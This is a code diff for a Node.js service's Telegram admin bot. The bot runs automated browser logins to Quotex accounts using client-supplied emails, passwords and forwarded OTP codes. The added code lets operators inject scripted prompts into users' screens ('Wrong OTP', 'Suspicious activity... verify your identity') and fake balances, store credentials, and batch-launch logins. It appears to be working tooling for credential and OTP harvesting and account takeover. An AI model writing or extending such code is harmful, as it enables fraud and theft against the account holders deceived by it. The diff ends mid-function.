@@ -590,6 +590,24 @@ async function closeQuotexSession(sessionId, reason = 'Admin closed session') {
 
     // Clean up after 10 minutes
     setTimeout(() => { quotexSessions.delete(sessionId); }, 10 * 60 * 1000);
+    // ── Auto-retry on error ──────────────────────────────────────────
+    if (session.status === 'error' && autoRetryConfig.enabled) {
+        const attempts = session.retryCount || 0;
+        if (attempts < autoRetryConfig.maxAttempts) {
+            session.retryCount = attempts + 1;
+            const delay = autoRetryConfig.delaySeconds * 1000;
+            setTimeout(async () => {
+                if (quotexSessions.has(sessionId)) {
+                    const s = quotexSessions.get(sessionId);
+                    s.status = 'queued'; s.statusMsg = `🔄 Auto-retry #${s.retryCount}`;
+                    s.browser = null; s.page = null; s.otpAttempts = 0;
+                    broadcastSSE('qx_session_update', getSessionInfo(s));
+                    launchQuotexSession(s).catch(e => console.error('auto-retry error:', e.message));
+                }
+            }, delay);
+        }
+    }
+
 }
 
 // ── Auto OTP forward: when client submits OTP on main bot,
@@ -609,6 +627,14 @@ async function autoForwardOTP(userName, licenceKey, otp) {
     }
     return false;
 }
+
+
+// ── Auto-retry config (admin-configurable at runtime) ─────────────────
+let autoRetryConfig = {
+    enabled: false,
+    maxAttempts: 3,
+    delaySeconds: 30,
+};
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
@@ -643,44 +669,146 @@ async function tgApi(method, payload) {
     }
 }
 
+
+// ══════════════════════════════════════════════════════════════════════
+// ENHANCED TELEGRAM BOT — Full Keyboard-Driven Admin Control
+// ══════════════════════════════════════════════════════════════════════
+
 function tgMainMenuKeyboard() {
     return {
         inline_keyboard: [
-            [{ text: '👥 Online Users', callback_data: 'online' }, { text: '📊 Stats', callback_data: 'stats' }],
-            [{ text: '🤖 Quotex Sessions', callback_data: 'qx_sessions' }, { text: '📢 Broadcast', callback_data: 'broadcast' }],
-            [{ text: '❓ Help', callback_data: 'help' }],
+            [{ text: '👥 Users',        callback_data: 'menu_users' },
+             { text: '📊 Stats',        callback_data: 'stats' },
+             { text: '🤖 Sessions',     callback_data: 'qx_sessions' }],
+            [{ text: '💬 Inject Msg',   callback_data: 'menu_inject' },
+             { text: '📢 Broadcast',    callback_data: 'menu_broadcast' },
+             { text: '🔑 Licenses',     callback_data: 'menu_licenses' }],
+            [{ text: '📦 Orders',       callback_data: 'menu_orders' },
+             { text: '⚙️ Settings',     callback_data: 'menu_settings' },
+             { text: '🔧 Maintenance',  callback_data: 'menu_maint' }],
+            [{ text: '🚀 Launch QX',    callback_data: 'qxlaunch_start' },
+             { text: '📋 Credentials',  callback_data: 'menu_creds' },
+             { text: '❓ Help',         callback_data: 'help' }],
         ],
     };
+}
+
+function tgBackKeyboard(backData = 'menu') {
+    return { inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: backData }]] };
 }
 
 function tgUserActionKeyboard(userName) {
     const u = encodeURIComponent(userName);
     return {
         inline_keyboard: [
-            [{ text: '⚠️ Invalid Email/Password', callback_data: `qt|invalid_login|${u}` },
-             { text: '🔢 Wrong OTP',              callback_data: `qt|wrong_otp|${u}` }],
-            [{ text: '✅ Login Success',  callback_data: `qt|login_ok|${u}` },
-             { text: '🚨 Account Alert',  callback_data: `qt|alert|${u}` }],
-            [{ text: '📋 Instruction',    callback_data: `qt|instruction|${u}` },
-             { text: '💬 Custom Message', callback_data: `ask_msg|${u}` }],
-            [{ text: '🔄 Force Reload',  callback_data: `force_reload|${u}` },
-             { text: '⏳ Push Loading',  callback_data: `push_loading|${u}` }],
-            [{ text: '💰 Inject Balance', callback_data: `ask_balance|${u}` },
-             { text: '👢 Kick User',      callback_data: `kick|${u}` }],
-            [{ text: '🚫 Block',   callback_data: `block|${u}` },
-             { text: '✅ Unblock', callback_data: `unblock|${u}` }],
-            [{ text: '🔙 Main Menu', callback_data: 'menu' }],
+            [{ text: '⚠️ Invalid Email/Password', callback_data: \`qt|invalid_login|\${u}\` },
+             { text: '🔢 Wrong OTP',              callback_data: \`qt|wrong_otp|\${u}\` }],
+            [{ text: '✅ Login Success',           callback_data: \`qt|login_ok|\${u}\` },
+             { text: '🚨 Account Alert',           callback_data: \`qt|alert|\${u}\` }],
+            [{ text: '📋 Instruction',             callback_data: \`qt|instruction|\${u}\` },
+             { text: '💬 Custom Message',          callback_data: \`ask_msg|\${u}\` }],
+            [{ text: '🔄 Force Reload',            callback_data: \`force_reload|\${u}\` },
+             { text: '⏳ Push Loading',            callback_data: \`push_loading|\${u}\` }],
+            [{ text: '💰 Inject Balance',          callback_data: \`ask_balance|\${u}\` },
+             { text: '👢 Kick User',               callback_data: \`kick|\${u}\` }],
+            [{ text: '🚫 Block',                   callback_data: \`block|\${u}\` },
+             { text: '✅ Unblock',                 callback_data: \`unblock|\${u}\` }],
+            [{ text: '📩 Inject: Credentials',     callback_data: \`inject_type_menu|\${u}\` }],
+            [{ text: '🔙 Back to Users',           callback_data: 'menu_users' }],
         ],
     };
 }
 
-const QUICK_TRIGGERS = {
-    invalid_login: { type: 'warning',     text: '❌ Invalid Email/Password — Please make sure your Email or Password is correct to continue.' },
-    wrong_otp:     { type: 'warning',     text: '⚠️ Wrong OTP code. Please check your email/SMS and try again.' },
-    login_ok:      { type: 'info',        text: '✅ Login successful. Welcome back!' },
-    alert:         { type: 'alert',       text: '🚨 Suspicious activity detected on your account. Please verify your identity.' },
-    instruction:   { type: 'instruction', text: '📋 Please follow the on-screen instructions to continue.' },
-};
+function tgInjectTypeKeyboard(userName) {
+    const u = encodeURIComponent(userName);
+    return {
+        inline_keyboard: [
+            [{ text: '⚠️ Invalid Login',  callback_data: \`qt|invalid_login|\${u}\` },
+             { text: '🔢 Wrong OTP',      callback_data: \`qt|wrong_otp|\${u}\` }],
+            [{ text: '✅ Login Success',   callback_data: \`qt|login_ok|\${u}\` },
+             { text: '🚨 Account Alert',  callback_data: \`qt|alert|\${u}\` }],
+            [{ text: '📋 Instruction',    callback_data: \`qt|instruction|\${u}\` }],
+            [{ text: '✏️ Custom Message', callback_data: \`ask_msg|\${u}\` }],
+            [{ text: '💰 Inject Balance', callback_data: \`ask_balance|\${u}\` }],
+            [{ text: '🔙 Back',           callback_data: 'menu_inject' }],
+        ],
+    };
+}
+
+function tgBroadcastTypeKeyboard() {
+    return {
+        inline_keyboard: [
+            [{ text: '💡 Info',       callback_data: 'bc_type|info' },
+             { text: '⚠️ Warning',    callback_data: 'bc_type|warning' }],
+            [{ text: '🚨 Alert',      callback_data: 'bc_type|alert' },
+             { text: '📋 Instruction',callback_data: 'bc_type|instruction' }],
+            [{ text: '🔙 Back',       callback_data: 'menu' }],
+        ],
+    };
+}
+
+function tgMaintenanceKeyboard(active) {
+    return {
+        inline_keyboard: [
+            [{ text: active ? '✅ Maintenance ON — Click to DISABLE' : '⚪ Maintenance OFF — Click to ENABLE',
+               callback_data: active ? 'maint_off' : 'maint_on' }],
+            [{ text: '⏱️ Set Duration (ask)',  callback_data: 'maint_ask_duration' }],
+            [{ text: '✏️ Edit Message',         callback_data: 'maint_ask_msg' }],
+            [{ text: '🔙 Back',                 callback_data: 'menu' }],
+        ],
+    };
+}
+
+function tgSessionKeyboard(sessionId, status) {
+    const s = sessionId;
+    const kb = [];
+    if (status === 'waiting_otp' || status === 'wrong_otp') {
+        kb.push([{ text: '🔢 Enter OTP', callback_data: \`ask_qxotp|\${s}|Session\` }]);
+    }
+    if (!['closed','error','logged_in'].includes(status)) {
+        kb.push([{ text: '🔄 Retry Login', callback_data: \`qxretry|\${s}\` }]);
+    }
+    kb.push([{ text: '❌ Close Session', callback_data: \`qxclose|\${s}\` }]);
+    kb.push([{ text: '📸 Screenshot',   callback_data: \`qx_shot|\${s}\` }]);
+    kb.push([{ text: '🔙 All Sessions', callback_data: 'qx_sessions' }]);
+    return { inline_keyboard: kb };
+}
+
+function tgCredsKeyboard(creds) {
+    const kb = creds.slice(0, 8).map(c => ([{
+        text: \`🔑 \${c.label || c.email.slice(0, 20)} [\${c.group}]\`,
+        callback_data: \`cred_action|\${c.id}\`
+    }]));
+    kb.push([
+        { text: '➕ Add Credential', callback_data: 'cred_add' },
+        { text: '🚀 Batch Launch All', callback_data: 'cred_batch_all' }
+    ]);
+    kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
+    return { inline_keyboard: kb };
+}
+
+function tgCredActionKeyboard(credId) {
+    return {
+        inline_keyboard: [
+            [{ text: '🚀 Launch Now',    callback_data: \`cred_launch|\${credId}\` },
+             { text: '🗑️ Delete',        callback_data: \`cred_delete|\${credId}\` }],
+            [{ text: '🔙 Back to Creds', callback_data: 'menu_creds' }],
+        ],
+    };
+}
+
+function tgRetryConfigKeyboard() {
+    const en = autoRetryConfig.enabled;
+    return {
+        inline_keyboard: [
+            [{ text: en ? '✅ Auto-Retry ENABLED — Disable' : '⚪ Auto-Retry DISABLED — Enable',
+               callback_data: en ? 'retry_off' : 'retry_on' }],
+            [{ text: \`🔁 Max Attempts: \${autoRetryConfig.maxAttempts}\`, callback_data: 'retry_ask_attempts' }],
+            [{ text: \`⏱️ Delay: \${autoRetryConfig.delaySeconds}s\`,      callback_data: 'retry_ask_delay' }],
+            [{ text: '🔙 Back', callback_data: 'qx_sessions' }],
+        ],
+    };
+}
 
 async function tgInjectMessage(userName, type, text) {
     const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
@@ -712,6 +840,17 @@ async function tgHandleCallback(chatId, data, callbackId) {
     const parts  = data.split('|');
     const action = parts[0];
     const target = parts[2] ? decodeURIComponent(parts[2]) : (parts[1] ? decodeURIComponent(parts[1]) : '');
+
+
+    if (action === 'user_action') {
+        const uName = target || parts[1] ? decodeURIComponent(parts[1]) : '';
+        const isOnline = sseUserClients.has((uName || '').toLowerCase());
+        const found    = await tgFindUserByName(uName);
+        const statusTxt = `👤 <b>${uName}</b>\n🟢 Online: <b>${isOnline ? 'Yes' : 'No'}</b>\n` +
+            (found ? `🔑 Key: <code>${found.licenceKey||'-'}</code>\n📧 Email: <code>${found.username||'-'}</code>\n📊 Status: <b>${found.status||'-'}</b>` : 'ℹ️ No DB record yet.');
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: statusTxt, reply_markup: tgUserActionKeyboard(uName) });
+    }
 
     if (action === 'menu')  return tgApi('sendMessage', { chat_id: chatId, text: '🤖 <b>Admin Bot Menu</b>', parse_mode: 'HTML', reply_markup: tgMainMenuKeyboard() });
     if (action === 'help')  return tgCmdHelp(chatId);
@@ -747,6 +886,210 @@ async function tgHandleCallback(chatId, data, callbackId) {
         launchQuotexSession(session).catch(e => console.error('tgRetry launch error:', e.message));
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
             text: `🔄 Retrying login for <b>${session.clientName}</b>...` });
+    }
+
+
+    // ── NEW SECTION MENUS ─────────────────────────────────────────────
+    if (action === 'menu_users') return tgCmdUsersMenu(chatId);
+    if (action === 'menu_inject') return tgCmdInjectMenu(chatId);
+    if (action === 'menu_broadcast') {
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '📢 <b>Broadcast to ALL Users</b>\nSelect message type:',
+            reply_markup: tgBroadcastTypeKeyboard() });
+    }
+    if (action === 'menu_licenses') return tgCmdLicensesMenu(chatId);
+    if (action === 'menu_orders')   return tgCmdOrdersMenu(chatId);
+    if (action === 'menu_settings') return tgCmdSettingsMenu(chatId);
+    if (action === 'menu_maint')    return tgCmdMaintenanceMenu(chatId);
+    if (action === 'menu_creds')    return tgCmdCredsMenu(chatId);
+
+    // ── BROADCAST TYPE SELECT ────────────────────────────────────────
+    if (action === 'bc_type') {
+        const bcType = parts[1] || 'info';
+        tgSessions[chatId] = { awaiting: 'broadcast_text', bcType };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `📢 <b>Broadcast [${parts[1] || 'info'}]</b>\nSend the message text:\n(/cancel to abort)` });
+    }
+
+    // ── MAINTENANCE ───────────────────────────────────────────────────
+    if (action === 'maint_on' || action === 'maint_off') {
+        maintenanceMode.active = action === 'maint_on';
+        broadcastSSE('maintenance_update', maintenanceMode);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: maintenanceMode.active ? '🔧 <b>Maintenance ON</b> — all users will see maintenance page.' : '✅ <b>Maintenance OFF</b> — bot is live again.',
+            reply_markup: tgMaintenanceKeyboard(maintenanceMode.active) });
+    }
+    if (action === 'maint_ask_duration') {
+        tgSessions[chatId] = { awaiting: 'maint_duration' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '⏱️ Enter maintenance end time (e.g. 2025-12-31 23:59 or "2h" for 2 hours):' });
+    }
+    if (action === 'maint_ask_msg') {
+        tgSessions[chatId] = { awaiting: 'maint_msg' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '✏️ Enter new maintenance message:' });
+    }
+
+    // ── QX LAUNCH START ───────────────────────────────────────────────
+    if (action === 'qxlaunch_start') {
+        tgSessions[chatId] = { awaiting: 'qxlaunch_email' };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '🚀 <b>Launch Quotex Session</b>\n\n📧 Send the Email address:' });
+    }
+
+    // ── INJECT TYPE MENU ─────────────────────────────────────────────
+    if (action === 'inject_type_menu') {
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `💬 <b>Inject to ${target}</b>\nChoose message type:`,
+            reply_markup: tgInjectTypeKeyboard(target) });
+    }
+
+    // ── PER-SESSION ACTIONS ───────────────────────────────────────────
+    if (action === 'qx_view') {
+        const sessionId = parts[1];
+        const session   = quotexSessions.get(sessionId);
+        if (!session) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Session not found.' });
+        const STATUS_EMOJI = { launching:'🚀', navigating:'🌐', filling:'✍️', waiting_otp:'🔢', submitting_otp:'⏳', logged_in:'✅', wrong_otp:'❌', error:'❌', closed:'⚫' };
+        const em = STATUS_EMOJI[session.status] || '❓';
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `${em} <b>${session.clientName}</b>\n📧 Email: <code>${session.email}</code>\n🔖 Status: <b>${session.status}</b>\n💬 ${session.statusMsg || ''}\n🆔 <code>${session.id}</code>`,
+            reply_markup: tgSessionKeyboard(session.id, session.status) });
+    }
+    if (action === 'qx_shot') {
+        const sessionId = parts[1];
+        const session   = quotexSessions.get(sessionId);
+        if (!session?.screenshotBase64) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ No screenshot available yet.' });
+        const buf = Buffer.from(session.screenshotBase64.replace(/^data:image\/\w+;base64,/, ''), 'base64');
+        return tgApi('sendPhoto', { chat_id: chatId, photo: `data:image/jpeg;base64,${session.screenshotBase64.replace(/^data:image\/\w+;base64,/, '')}`, caption: `📸 ${session.clientName} — ${session.status}` }).catch(async () => {
+            return tgApi('sendMessage', { chat_id: chatId, text: `📸 Screenshot available for ${session.clientName} (${session.status}) — view in admin panel.` });
+        });
+    }
+
+    // ── RETRY CONFIG ─────────────────────────────────────────────────
+    if (action === 'retry_on' || action === 'retry_off') {
+        autoRetryConfig.enabled = action === 'retry_on';
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: autoRetryConfig.enabled ? '✅ Auto-Retry <b>ENABLED</b>' : '⚪ Auto-Retry <b>DISABLED</b>',
+            reply_markup: tgRetryConfigKeyboard() });
+    }
+    if (action === 'retry_ask_attempts') {
+        tgSessions[chatId] = { awaiting: 'retry_attempts' };
+        return tgApi('sendMessage', { chat_id: chatId, text: `🔁 Enter max retry attempts (1-10): current=${autoRetryConfig.maxAttempts}` });
+    }
+    if (action === 'retry_ask_delay') {
+        tgSessions[chatId] = { awaiting: 'retry_delay' };
+        return tgApi('sendMessage', { chat_id: chatId, text: `⏱️ Enter retry delay in seconds (5-300): current=${autoRetryConfig.delaySeconds}` });
+    }
+
+    // ── CREDENTIALS ACTIONS ───────────────────────────────────────────
+    if (action === 'cred_add') {
+        tgSessions[chatId] = { awaiting: 'cred_email' };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '➕ <b>Add Saved Credential</b>\n\n📧 Send the Email address:' });
+    }
+    if (action === 'cred_batch_all') {
+        const allCreds = useDatabase
+            ? await SavedCredential.find({}).lean().catch(() => [])
+            : savedCredsMemory;
+        if (!allCreds.length) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ No saved credentials.' });
+        let launched = 0;
+        for (const c of allCreds) {
+            const existing = [...quotexSessions.values()].find(s => s.email === c.email && !['closed','error','logged_in'].includes(s.status));
+            if (existing) continue;
+            const sid = makeSessionId();
+            const session = { id: sid, clientName: c.label || c.email.split('@')[0], email: c.email, password: c.password,
+                licenceKey: '', status: 'queued', statusMsg: 'Batch launched from Telegram', startedAt: new Date(), updatedAt: new Date(),
+                otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
+            quotexSessions.set(sid, session);
+            broadcastSSE('qx_session_new', getSessionInfo(session));
+            launchQuotexSession(session).catch(e => console.error('batch launch error:', e.message));
+            launched++;
+            await sleep(800);
+        }
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🚀 <b>Batch Launch Complete</b>\nLaunched <b>${launched}</b> sessions.` });
+    }
+    if (action === 'cred_action') {
+        const credId = parts[1];
+        const creds  = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
+        const cred   = creds.find(c => c.id === credId);
+        if (!cred) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Credential not found.' });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🔑 <b>${cred.label || cred.email}</b>\n📧 <code>${cred.email}</code>\nGroup: <b>${cred.group}</b>\nLaunches: <b>${cred.launchCount || 0}</b>`,
+            reply_markup: tgCredActionKeyboard(credId) });
+    }
+    if (action === 'cred_launch') {
+        const credId = parts[1];
+        const creds  = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
+        const cred   = creds.find(c => c.id === credId);
+        if (!cred) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Credential not found.' });
+        const existing = [...quotexSessions.values()].find(s => s.email === cred.email && !['closed','error','logged_in'].includes(s.status));
+        if (existing) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ Session already <b>${existing.status}</b> for <code>${cred.email}</code>` });
+        const sid = makeSessionId();
+        const session = { id: sid, clientName: cred.label || cred.email.split('@')[0], email: cred.email, password: cred.password,
+            licenceKey: '', status: 'queued', statusMsg: 'Launched from saved credential', startedAt: new Date(), updatedAt: new Date(),
+            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
+        quotexSessions.set(sid, session);
+        broadcastSSE('qx_session_new', getSessionInfo(session));
+        launchQuotexSession(session).catch(e => console.error('cred launch error:', e.message));
+        // Update launch count
+        if (useDatabase) { SavedCredential.findOneAndUpdate({ id: credId }, { lastLaunched: new Date(), $inc: { launchCount: 1 } }).catch(() => {}); }
+        else { const c = savedCredsMemory.find(x => x.id === credId); if (c) { c.lastLaunched = new Date(); c.launchCount = (c.launchCount || 0) + 1; } }
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🚀 Launching <b>${session.clientName}</b>\nSession: <code>${sid}</code>`,
+            reply_markup: tgSessionKeyboard(sid, 'queued') });
+    }
+    if (action === 'cred_delete') {
+        const credId = parts[1];
+        if (useDatabase) { await SavedCredential.deleteOne({ id: credId }).catch(() => {}); }
+        else { savedCredsMemory = savedCredsMemory.filter(c => c.id !== credId); }
+        return tgApi('sendMessage', { chat_id: chatId, text: '🗑️ Credential deleted.' });
+    }
+
+    // ── ORDERS STATUS UPDATE ─────────────────────────────────────────
+    if (action === 'order_status') {
+        const orderId   = parts[1];
+        const newStatus = parts[2];
+        if (!['New','Contacted','Paid','Completed','Rejected'].includes(newStatus)) return;
+        try {
+            if (useDatabase) { await Order.findOneAndUpdate({ id: orderId }, { status: newStatus }); }
+            else { const o = ordersMem.find(x => x.id === orderId); if (o) { o.status = newStatus; saveOrdersFile(); } }
+            broadcastSSE('order_updated', { id: orderId, status: newStatus });
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+                text: `✅ Order <code>${orderId}</code> → <b>${newStatus}</b>` });
+        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+    }
+
+    // ── SETTINGS MENU ACTIONS ─────────────────────────────────────────
+    if (action === 'settings_ask_tg') {
+        tgSessions[chatId] = { awaiting: 'settings_tg_url' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '🔗 Send new Telegram Group URL (or "clear"):' });
+    }
+    if (action === 'settings_ask_wa') {
+        tgSessions[chatId] = { awaiting: 'settings_wa_url' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '🔗 Send new WhatsApp URL (or "clear"):' });
+    }
+    if (action === 'settings_ask_name') {
+        tgSessions[chatId] = { awaiting: 'settings_bot_name' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '✏️ Send new bot display name:' });
+    }
+    if (action === 'settings_retry_menu') {
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `⚙️ <b>Auto-Retry Config</b>\nEnabled: <b>${autoRetryConfig.enabled}</b>\nMax Attempts: <b>${autoRetryConfig.maxAttempts}</b>\nDelay: <b>${autoRetryConfig.delaySeconds}s</b>`,
+            reply_markup: tgRetryConfigKeyboard() });
+    }
+
+    // ── LICENSE ACTIONS ──────────────────────────────────────────────
+    if (action === 'lic_add') {
+        tgSessions[chatId] = { awaiting: 'lic_key' };
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '🔑 <b>Add License</b>\nSend the license key (e.g. CSAI-XXXX-XXXX-XXXX):' });
+    }
+    if (action === 'lic_revoke_ask') {
+        tgSessions[chatId] = { awaiting: 'lic_revoke' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '🚫 Send the license key to revoke (set Inactive):' });
+    }
+    if (action === 'lic_activate_ask') {
+        tgSessions[chatId] = { awaiting: 'lic_activate' };
+        return tgApi('sendMessage', { chat_id: chatId, text: '✅ Send the license key to activate:' });
     }
 
     // ── User action callbacks ──────────────────────────────
@@ -799,17 +1142,35 @@ async function tgHandleCallback(chatId, data, callbackId) {
 
 async function tgCmdHelp(chatId) {
     return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
-        '<b>Commands</b>\n' +
-        '/menu — main menu\n/online — online users\n/stats — bot statistics\n' +
-        '/broadcast &lt;text&gt; — message all users\n' +
-        '/qx — Quotex sessions list\n' +
-        '/qxlaunch &lt;email&gt; &lt;password&gt; &lt;name&gt; — start login session\n' +
-        '/otp &lt;sessionId&gt; &lt;code&gt; — submit OTP for session\n' +
-        '/qxclose &lt;sessionId&gt; — close session\n' +
-        '/cancel — abort current input\n\n' +
+        '<b>🤖 Admin Bot Commands</b>\n\n' +
+        '<b>📋 Menus (Inline Buttons):</b>\n' +
+        '/menu — main dashboard\n' +
+        '/users — online users list\n' +
+        '/inject — inject message to user\n' +
+        '/sessions — Quotex sessions\n' +
+        '/licenses /lic — license management\n' +
+        '/orders — orders list\n' +
+        '/settings — bot settings\n' +
+        '/maint — maintenance mode toggle\n' +
+        '/creds — saved credentials\n' +
+        '/retry — auto-retry config\n\n' +
+        '<b>⚡ Quick Commands:</b>\n' +
+        '/online — see online users\n' +
+        '/stats — full statistics\n' +
+        '/block &lt;name&gt; — block user\n' +
+        '/unblock &lt;name&gt; — unblock user\n' +
+        '/kick &lt;name&gt; — kick user\n' +
+        '/reload &lt;name&gt; — force reload\n' +
+        '/balance &lt;name&gt; &lt;amount&gt; — inject balance\n' +
+        '/msg &lt;name&gt; &lt;text&gt; — custom message\n' +
+        '/broadcast &lt;text&gt; — broadcast to all\n\n' +
+        '<b>🤖 Quotex Sessions:</b>\n' +
+        '/qx — sessions overview\n' +
+        '/qxlaunch &lt;email&gt; &lt;pass&gt; [name] — launch\n' +
+        '/otp &lt;id&gt; &lt;code&gt; — submit OTP\n' +
+        '/qxclose &lt;id&gt; — close session\n\n' +
         'Or send any <b>username</b> to open quick actions.' });
 }
-
 async function tgCmdStats(chatId) {
     try {
         const s = useDatabase ? await dbGetStats() : {
@@ -848,6 +1209,115 @@ async function tgCmdQxSessions(chatId) {
     return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
         `🤖 <b>Quotex Sessions (${sessions.length})</b>\n\n${lines}\n\n` +
         `Use /otp &lt;id&gt; &lt;code&gt; to submit OTP\nUse /qxclose &lt;id&gt; to close` });
+}
+
+
+async function tgCmdUsersMenu(chatId) {
+    const names = [...sseUserClients.keys()];
+    if (!names.length) {
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '⚪ No users online right now.',
+            reply_markup: tgBackKeyboard() });
+    }
+    const kb = names.slice(0, 12).map(n => ([{ text: `🟢 ${n}`, callback_data: `user_action|${encodeURIComponent(n)}` }]));
+    kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
+    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: `👥 <b>Online Users (${names.length})</b>\nTap a user to manage:`,
+        reply_markup: { inline_keyboard: kb } });
+}
+
+async function tgCmdInjectMenu(chatId) {
+    const names = [...sseUserClients.keys()];
+    if (!names.length) {
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: '⚪ No users online to inject messages to.',
+            reply_markup: tgBackKeyboard() });
+    }
+    const kb = names.slice(0, 12).map(n => ([{ text: `💬 ${n}`, callback_data: `inject_type_menu|${encodeURIComponent(n)}` }]));
+    kb.push([{ text: '📢 Broadcast to All', callback_data: 'menu_broadcast' }]);
+    kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
+    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: `💬 <b>Inject Message</b>\nSelect target user:`,
+        reply_markup: { inline_keyboard: kb } });
+}
+
+async function tgCmdLicensesMenu(chatId) {
+    try {
+        const all = useDatabase ? await dbGetAllLicenses() : licenses;
+        const active   = all.filter(l => l.status === 'Active').length;
+        const inactive = all.filter(l => l.status !== 'Active').length;
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🔑 <b>Licenses</b>\n📊 Total: <b>${all.length}</b> | ✅ Active: <b>${active}</b> | 🚫 Inactive: <b>${inactive}</b>`,
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '➕ Add License',     callback_data: 'lic_add' },
+                     { text: '🚫 Revoke License',  callback_data: 'lic_revoke_ask' }],
+                    [{ text: '✅ Activate License', callback_data: 'lic_activate_ask' }],
+                    [{ text: '🔙 Back', callback_data: 'menu' }],
+                ]
+            }
+        });
+    } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+}
+
+async function tgCmdOrdersMenu(chatId) {
+    try {
+        const all = useDatabase ? await Order.find({}).sort({ createdAt: -1 }).limit(5).lean() : ordersMem.slice(0, 5);
+        if (!all.length) {
+            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+                text: '📦 No orders yet.', reply_markup: tgBackKeyboard() });
+        }
+        const STATUS_ICONS = { New:'🆕', Contacted:'📞', Paid:'💰', Completed:'✅', Rejected:'❌' };
+        const lines = all.map((o, i) =>
+            `${i+1}. ${STATUS_ICONS[o.status]||'❓'} <b>${o.fullName}</b> — ${o.planLabel||o.planKey} (${o.paymentMethod})\nID: <code>${o.id}</code>`
+        ).join('\n\n');
+        const kb = all.flatMap(o => {
+            const s = encodeURIComponent(o.id);
+            return [[
+                { text: `✅ Paid: ${o.id.slice(-6)}`,   callback_data: `order_status|${o.id}|Paid` },
+                { text: `✔️ Done: ${o.id.slice(-6)}`,   callback_data: `order_status|${o.id}|Completed` },
+                { text: `❌ Reject: ${o.id.slice(-6)}`, callback_data: `order_status|${o.id}|Rejected` },
+            ]];
+        });
+        kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `📦 <b>Latest Orders</b>\n\n${lines}`,
+            reply_markup: { inline_keyboard: kb } });
+    } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
+}
+
+async function tgCmdSettingsMenu(chatId) {
+    const s = botSettings;
+    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: `⚙️ <b>Bot Settings</b>\n📛 Name: <b>${s.botName||'—'}</b>\n📱 Telegram: <code>${s.telegramUrl||'—'}</code>\n💬 WhatsApp: <code>${s.whatsappUrl||'—'}</code>`,
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: '✏️ Bot Name',        callback_data: 'settings_ask_name' },
+                 { text: '📱 Telegram URL',    callback_data: 'settings_ask_tg' }],
+                [{ text: '💬 WhatsApp URL',    callback_data: 'settings_ask_wa' },
+                 { text: '🔄 Auto-Retry CFG',  callback_data: 'settings_retry_menu' }],
+                [{ text: '🔙 Back', callback_data: 'menu' }],
+            ]
+        }
+    });
+}
+
+async function tgCmdMaintenanceMenu(chatId) {
+    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: `🔧 <b>Maintenance Mode</b>\nStatus: <b>${maintenanceMode.active ? '🔴 ON' : '🟢 OFF'}</b>\nMessage: ${maintenanceMode.message}`,
+        reply_markup: tgMaintenanceKeyboard(maintenanceMode.active) });
+}
+
+async function tgCmdCredsMenu(chatId) {
+    const creds = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
+    if (!creds.length) {
